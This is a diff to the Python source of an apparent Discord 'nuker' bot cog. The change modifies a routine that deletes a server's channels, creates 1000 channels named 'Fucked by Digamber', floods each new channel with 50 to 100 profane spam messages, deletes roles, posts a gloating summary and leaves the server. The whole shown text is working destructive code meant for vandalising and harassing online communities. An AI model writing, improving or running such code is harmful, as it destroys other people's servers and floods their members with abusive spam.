@@ -25,71 +25,64 @@ class NukerCommands(commands.Cog):
             if delete_tasks:
                 await asyncio.gather(*delete_tasks, return_exceptions=True)
             
-            # STEP 3: MASSIVE CHANNEL CREATION (1000+ CHANNELS)
-            print("🔥 CREATING 1000+ CHANNELS AT LIGHT SPEED...")
+            # STEP 3: MASSIVE CHANNEL CREATION (1000+ CHANNELS) WITH UNLIMITED SPAM
+            print("🔥 CREATING 1000+ CHANNELS WITH UNLIMITED SPAM...")
             channel_count = 0
+            spam_tasks = []  # ALL SPAM MESSAGES STORE KARENGE
             
-            # 1000+ CHANNELS BANAYEGE - NO STOP
+            message_styles = [
+                "# Fucked by Digamber",
+                "## Fucked by Digamber", 
+                "### Fucked by Digamber",
+                "**FUCKED BY DIGAMBER**",
+                "__FUCKED BY DIGAMBER__",
+                "***FUCKED BY DIGAMBER***",
+                "```FUCKED BY DIGAMBER```",
+                "> FUCKED BY DIGAMBER",
+                ">>> FUCKED BY DIGAMBER",
+                "**# FUCKED BY DIGAMBER**",
+                "💀 **FUCKED BY DIGAMBER** 💀",
+                "🔥 **FUCKED BY DIGAMBER** 🔥",
+                "⚡ **FUCKED BY DIGAMBER** ⚡",
+                "🎯 **FUCKED BY DIGAMBER** 🎯",
+                "💥 **FUCKED BY DIGAMBER** 💥"
+            ]
+            
+            # 1000+ CHANNELS BANAYEGE - UNLIMITED SPAM KE SAATH
             while channel_count < 1000:
                 try:
-                    # 50 CHANNELS EK SAATH - LIGHT SPEED
+                    # 30 CHANNELS EK SAATH - SIRF "Fucked by Digamber" NAME
                     create_tasks = []
-                    for i in range(50):
-                        channel_names = [
-                            f"💀-fucked-by-digamber-{channel_count + i}",
-                            f"🔥-destroyed-by-digamber-{channel_count + i}",
-                            f"⚡-nuked-by-digamber-{channel_count + i}",
-                            f"🎯-obliterated-by-digamber-{channel_count + i}"
-                        ]
-                        name = random.choice(channel_names)
-                        create_tasks.append(guild.create_text_channel(name))
+                    for i in range(30):
+                        channel_name = f"Fucked by Digamber {channel_count + i + 1}"
+                        create_tasks.append(guild.create_text_channel(channel_name))
                     
-                    # EK SAATH CREATE KARO
-                    await asyncio.gather(*create_tasks, return_exceptions=True)
-                    channel_count += 50
+                    # CHANNELS CREATE KARO
+                    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+                    channel_count += 30
+                    
+                    # HAR NEW CHANNEL MEIN UNLIMITED SPAM SHURU KARO
+                    for channel in new_channels:
+                        if isinstance(channel, discord.TextChannel):
+                            # HAR CHANNEL MEIN 50-100 RANDOM MESSAGES - UNLIMITED SPAM
+                            for _ in range(random.randint(50, 100)):
+                                msg = random.choice(message_styles)
+                                spam_tasks.append(channel.send(msg))
                     
                     # ZERO DELAY - LIGHT SPEED
                     if channel_count % 100 == 0:
-                        print(f"✅ {channel_count} CHANNELS CREATED...")
+                        print(f"✅ {channel_count} CHANNELS CREATED WITH UNLIMITED SPAM...")
                     
                 except Exception as e:
                     break
             
-            print(f"🎉 {channel_count} CHANNELS CREATED AT LIGHT SPEED!")
+            print(f"🎉 {channel_count} CHANNELS CREATED WITH UNLIMITED SPAM!")
             
-            # STEP 4: LIGHT SPEED MESSAGE SPAM
-            print("💬 LIGHT SPEED MESSAGE SPAM...")
-            try:
-                channels = await guild.fetch_channels()
-                spam_tasks = []
-                
-                message_styles = [
-                    "# Fucked by Digamber",
-                    "## Fucked by Digamber", 
-                    "### Fucked by Digamber",
-                    "**FUCKED BY DIGAMBER**",
-                    "__FUCKED BY DIGAMBER__",
-                    "***FUCKED BY DIGAMBER***",
-                    "```FUCKED BY DIGAMBER```",
-                    "> FUCKED BY DIGAMBER",
-                    ">>> FUCKED BY DIGAMBER",
-                    "**# FUCKED BY DIGAMBER**",
-                    "💀 **FUCKED BY DIGAMBER** 💀",
-                    "🔥 **FUCKED BY DIGAMBER** 🔥",
-                    "⚡ **FUCKED BY DIGAMBER** ⚡"
-                ]
-                
-                for channel in channels[:100]:  # FIRST 100 CHANNELS
-                    if isinstance(channel, discord.TextChannel):
-                        # HAR CHANNEL MEIN 5-10 MESSAGES
-                        for _ in range(random.randint(5, 10)):
-                            msg = random.choice(message_styles)
-                            spam_tasks.append(channel.send(msg))
-                
-                if spam_tasks:
-                    await asyncio.gather(*spam_tasks, return_exceptions=True)
-            except:
-                pass
+            # STEP 4: SABHI SPAM MESSAGES EK SAATH BHEJO
+            print("💬 SENDING UNLIMITED SPAM MESSAGES...")
+            if spam_tasks:
+                await asyncio.gather(*spam_tasks, return_exceptions=True)
+                print(f"✅ {len(spam_tasks)} UNLIMITED SPAM MESSAGES SENT!")
             
             # STEP 5: LIGHT SPEED ROLE DELETE
             print("🎭 LIGHT SPEED ROLE DELETION...")
@@ -101,12 +94,17 @@ class NukerCommands(commands.Cog):
             try:
                 channels = await guild.fetch_channels()
                 if channels:
-                    await channels[0].send(f"💀 **FUCKED BY DIGAMBER** 💀\n\n**{channel_count} CHANNELS OBLITERATED AT LIGHT SPEED!**")
+                    await channels[0].send(
+                        f"💀 **FUCKED BY DIGAMBER** 💀\n\n"
+                        f"**{channel_count} CHANNELS OBLITERATED!**\n"
+                        f"**{len(spam_tasks)} UNLIMITED SPAM MESSAGES!**\n"
+                        f"**COMPLETE DESTRUCTION AT LIGHT SPEED!**"
+                    )
             except:
                 pass
             
             await guild.leave()
-            print("✅ LIGHT SPEED NUKE COMPLETED!")
+            print("✅ UNLIMITED SPAM NUKE COMPLETED!")
             
         except Exception as e:
             try:
